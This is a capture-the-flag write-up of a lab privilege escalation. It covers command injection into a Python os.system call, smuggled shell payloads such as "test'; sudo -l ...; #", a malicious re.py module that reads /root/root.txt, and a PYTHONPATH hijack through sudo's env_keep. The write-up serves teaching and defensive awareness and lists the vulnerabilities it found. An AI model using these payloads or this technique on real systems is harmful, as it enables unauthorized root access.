# Batman's Secret 2 — Privilege Escalation Write-up

## 1. Initial Access

The first part of the room had already revealed an OS Command Injection in the custom service running on port `3000`.

The vulnerable Python code was:

```python
os.system("bash -c 'echo %s > /opt/hotline/logs/report.txt'" % alert_text)
```

By injecting shell commands, arbitrary commands could be executed as the user:

```bash
bruce
```



## 2. Sudo Enumeration

The following command was executed through the command injection:

```bash
test'; sudo -l > /opt/hotline/logs/report.txt 2>&1; #
```

Result:

```bash
Matching Defaults entries for bruce on gotham:
    mail_badpass, env_keep+=PYTHONPATH, use_pty

User bruce may run the following commands on gotham:
    (root) NOPASSWD: /usr/bin/python3 /opt/scanner/gotham_scanner.py
```

- `bruce` can execute `/opt/scanner/gotham_scanner.py` as `root`.
- No password is required because of `NOPASSWD`.
- `sudo` preserves the `PYTHONPATH` environment variable.

This suggested a possible **Python module hijacking** attack.



## 3. Inspecting the Root-Executed Script

The script was read through the command injection:

```bash
test'; cat /opt/scanner/gotham_scanner.py > /opt/hotline/logs/report.txt 2>&1; #

cat /opt/scanner/gotham_scanner.py
```

Relevant imports:

```python
import time
import re
```

The script later calls:

```python
re.search(...)
```

Because `PYTHONPATH` is preserved by `sudo`, Python can potentially be forced to load an attacker-controlled `re.py` before the legitimate module.



## 4. Creating a Malicious Python Module

A fake `re.py` module was created locally:

```python
with open("/root/root.txt", "r") as src:
    flag = src.read()

with open("/opt/hotline/logs/root_flag.txt", "w") as dst:
    dst.write(flag)

def search(*args, **kwargs):
    return None
```

This code:

1. Reads `/root/root.txt`.
2. Writes its content into `/opt/hotline/logs/root_flag.txt`.
3. Defines a fake `search()` function so the original scanner can still call `re.search()`.



## 5. Transferring the Malicious Module

Anonymous FTP allowed reading files but refused uploads:

```bash
550 Permission denied.
```

Therefore, `re.py` was encoded locally:

```bash
base64 -w0 re.py
```

The Base64 content was then injected through the vulnerable service and decoded on the target:

```bash
echo <BASE64_DATA> | base64 -d > /tmp/re.py
```

Verification:

```bash
ls -l /tmp/re.py

-rw-rw-r-- 1 bruce bruce 188 ... /tmp/re.py
```

The malicious module was successfully created.



## 6. Python Module Hijacking

The following payload was executed through the command injection:

```bash
export PYTHONPATH=/tmp; sudo /usr/bin/python3 /opt/scanner/gotham_scanner.py
```

Explanation:

```bash
export PYTHONPATH=/tmp
```

adds `/tmp` to Python's module search path.

Because `sudo` preserves `PYTHONPATH`:

```bash
env_keep+=PYTHONPATH
```

the root Python process also receives this value.

When the root script executes:

```python
import re
```

Python loads:

```bash
/tmp/re.py
```

The malicious module therefore executes with **root privileges**.

It reads:

```bash
/root/root.txt
```

and writes the flag into:

```bash
/opt/hotline/logs/root_flag.txt
```



## 7. Retrieving root.txt

The generated file was visible through anonymous FTP:

```bash
-rw-r--r-- 1 0 0 33 ... root_flag.txt
```

The owner UID `0` confirmed that the file had been created by `root`.

The file was downloaded:

```bash
cd logs
get root_flag.txt

cat root_flag.txt

EPI{8ruc3_W4yn3_15_7ru1Y_84tm4n}
```



## Attack Chain

```bash
Command Injection as bruce
        ↓
sudo -l enumeration
        ↓
Root Python script discovered
        ↓
PYTHONPATH preserved by sudo
        ↓
Attacker-controlled /tmp/re.py
        ↓
Python Module Hijacking
        ↓
Malicious module executed as root
        ↓
Read /root/root.txt
        ↓
Write root_flag.txt
        ↓
Retrieve file through FTP
```



## Vulnerabilities Identified

1. OS Command Injection in the Gotham Hotline service.
2. Excessive `sudo` privileges granted to `bruce`.
3. `NOPASSWD` execution of a Python script as root.
4. Dangerous preservation of `PYTHONPATH` through `sudo`.
5. Python module search path hijacking.
6. Sensitive files exposed through a writable/readable shared location.